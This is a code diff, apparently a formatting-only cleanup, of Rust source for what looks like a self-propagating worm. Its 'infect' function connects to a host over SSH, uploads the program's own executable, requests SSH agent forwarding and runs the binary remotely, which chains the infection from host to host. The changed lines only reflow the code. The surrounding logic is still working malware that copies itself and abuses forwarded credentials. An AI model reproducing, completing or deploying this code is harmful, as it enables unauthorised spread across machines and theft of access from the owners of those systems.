@@ -43,8 +43,7 @@ pub struct ChainLink {
 pub fn infect(host: &HostSpec) -> Result<ChainLink, Error> {
     // Establish TCP connection
     log::trace!("Connecting to {}", &host.host_addr);
-    let conn =
-        std::net::TcpStream::connect(&host.host_addr).map_err(Error::ConnectionFailed)?;
+    let conn = std::net::TcpStream::connect(&host.host_addr).map_err(Error::ConnectionFailed)?;
 
     // Create SSH session.
     let mut session = ssh2::Session::new().map_err(Error::SSHPreauthError)?;
@@ -96,11 +95,11 @@ pub fn infect(host: &HostSpec) -> Result<ChainLink, Error> {
     log::trace!("Executable uploaded as {}", &remote_exe_path);
 
     // Execute uploaded binary
-    let mut channel = session
-        .channel_session()
-        .map_err(Error::ExecuteDaisy)?;
+    let mut channel = session.channel_session().map_err(Error::ExecuteDaisy)?;
     log::trace!("Requesting SSH agent forwarding");
-    channel.request_auth_agent_forwarding().map_err(Error::ForwardAgent)?;
+    channel
+        .request_auth_agent_forwarding()
+        .map_err(Error::ForwardAgent)?;
     log::trace!("SSH agent forwarding successful");
     channel
         .exec(&remote_exe_path)
@@ -237,11 +236,12 @@ fn upload_executable_printf(session: &mut ssh2::Session) -> Result<String, Uploa
 
 /// Reads the contents of the current process' executable and returns the bytes.
 fn read_current_exe() -> Result<Vec<u8>, std::io::Error> {
-    let exe_path =
-        std::env::current_exe()?;
-    let exe_bytes: Vec<u8> =
-        std::fs::read(&exe_path)?;
-    log::trace!("Found current executable at path {}", exe_path.to_string_lossy());
+    let exe_path = std::env::current_exe()?;
+    let exe_bytes: Vec<u8> = std::fs::read(&exe_path)?;
+    log::trace!(
+        "Found current executable at path {}",
+        exe_path.to_string_lossy()
+    );
     Ok(exe_bytes)
 }
 
